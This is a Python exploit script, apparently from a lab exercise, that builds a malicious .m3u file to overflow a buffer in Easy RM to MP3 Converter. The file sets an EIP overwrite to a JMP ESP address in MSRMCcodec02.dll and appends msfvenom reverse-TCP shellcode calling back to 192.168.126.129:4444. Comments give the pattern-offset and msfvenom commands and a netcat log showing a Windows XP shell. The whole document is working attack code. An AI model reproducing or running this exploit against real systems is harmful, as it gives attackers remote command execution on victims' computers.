import os
import struct

class Exploit:
    payload_file = os.getcwd() + "\\payload.m3u"

    # root@kali:~# msf-pattern_create -l 35000 > payload.m3u 
    # root@kali:~# msf-pattern_offset -l 35000 -q 48316C48
    offset = 26095

    @classmethod
    def convert(cls, addr):
        return struct.pack("<I", addr)

    @classmethod
    def execute(cls):
        junk = "A" * cls.offset
        nop = b"\x90" * 32

        # root@kali:~# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.126.129 LPORT=4444 EXITFUNC=thread -f python -a x86 --platform windows -b "\x00\x0a"
        shellcode=  b""
        shellcode+= b"\xda\xd1\xd9\x74\x24\xf4\x5b\xba\x67\x2d\xd7\x27\x31"
        shellcode+= b"\xc9\xb1\x52\x83\xc3\x04\x31\x53\x13\x03\x34\x3e\x35"
        shellcode+= b"\xd2\x46\xa8\x3b\x1d\xb6\x29\x5c\x97\x53\x18\x5c\xc3"
        shellcode+= b"\x10\x0b\x6c\x87\x74\xa0\x07\xc5\x6c\x33\x65\xc2\x83"
        shellcode+= b"\xf4\xc0\x34\xaa\x05\x78\x04\xad\x85\x83\x59\x0d\xb7"
        shellcode+= b"\x4b\xac\x4c\xf0\xb6\x5d\x1c\xa9\xbd\xf0\xb0\xde\x88"
        shellcode+= b"\xc8\x3b\xac\x1d\x49\xd8\x65\x1f\x78\x4f\xfd\x46\x5a"
        shellcode+= b"\x6e\xd2\xf2\xd3\x68\x37\x3e\xad\x03\x83\xb4\x2c\xc5"
        shellcode+= b"\xdd\x35\x82\x28\xd2\xc7\xda\x6d\xd5\x37\xa9\x87\x25"
        shellcode+= b"\xc5\xaa\x5c\x57\x11\x3e\x46\xff\xd2\x98\xa2\x01\x36"
        shellcode+= b"\x7e\x21\x0d\xf3\xf4\x6d\x12\x02\xd8\x06\x2e\x8f\xdf"
        shellcode+= b"\xc8\xa6\xcb\xfb\xcc\xe3\x88\x62\x55\x4e\x7e\x9a\x85"
        shellcode+= b"\x31\xdf\x3e\xce\xdc\x34\x33\x8d\x88\xf9\x7e\x2d\x49"
        shellcode+= b"\x96\x09\x5e\x7b\x39\xa2\xc8\x37\xb2\x6c\x0f\x37\xe9"
        shellcode+= b"\xc9\x9f\xc6\x12\x2a\xb6\x0c\x46\x7a\xa0\xa5\xe7\x11"
        shellcode+= b"\x30\x49\x32\xb5\x60\xe5\xed\x76\xd0\x45\x5e\x1f\x3a"
        shellcode+= b"\x4a\x81\x3f\x45\x80\xaa\xaa\xbc\x43\x15\x82\xc0\x12"
        shellcode+= b"\xfd\xd1\x3c\x04\xa2\x5c\xda\x4c\x4a\x09\x75\xf9\xf3"
        shellcode+= b"\x10\x0d\x98\xfc\x8e\x68\x9a\x77\x3d\x8d\x55\x70\x48"
        shellcode+= b"\x9d\x02\x70\x07\xff\x85\x8f\xbd\x97\x4a\x1d\x5a\x67"
        shellcode+= b"\x04\x3e\xf5\x30\x41\xf0\x0c\xd4\x7f\xab\xa6\xca\x7d"
        shellcode+= b"\x2d\x80\x4e\x5a\x8e\x0f\x4f\x2f\xaa\x2b\x5f\xe9\x33"
        shellcode+= b"\x70\x0b\xa5\x65\x2e\xe5\x03\xdc\x80\x5f\xda\xb3\x4a"
        shellcode+= b"\x37\x9b\xff\x4c\x41\xa4\xd5\x3a\xad\x15\x80\x7a\xd2"
        shellcode+= b"\x9a\x44\x8b\xab\xc6\xf4\x74\x66\x43\x14\x97\xa2\xbe"
        shellcode+= b"\xbd\x0e\x27\x03\xa0\xb0\x92\x40\xdd\x32\x16\x39\x1a"
        shellcode+= b"\x2a\x53\x3c\x66\xec\x88\x4c\xf7\x99\xae\xe3\xf8\x8b"

        #   0x01a8f23a (b+0x001bf23a)  : "\xff\xe4" |  {PAGE_EXECUTE} [MSRMCcodec02.dll] ASLR: False, Rebase: True, SafeSEH: False, OS: False, v-1.0- (C:\Program Files\Easy RM to MP3 Converter\MSRMCcodec02.dll)
        eip = cls.convert(0x01a8f23a)

        payload = junk.encode() + eip + nop + shellcode

        with open(cls.payload_file, "wb") as pf:
            pf.write(payload)

        print("[+] Done writing payload to file.")

# root@kali:~# nc -nlvp 4444
# listening on [any] 4444 ...
# connect to [192.168.126.129] from (UNKNOWN) [192.168.126.130] 1106
# Microsoft Windows XP [Version 5.1.2600]
# (C) Copyright 1985-2001 Microsoft Corp.
#
# C:\Program Files\Easy RM to MP3 Converter>
if __name__ == "__main__":
    Exploit.execute()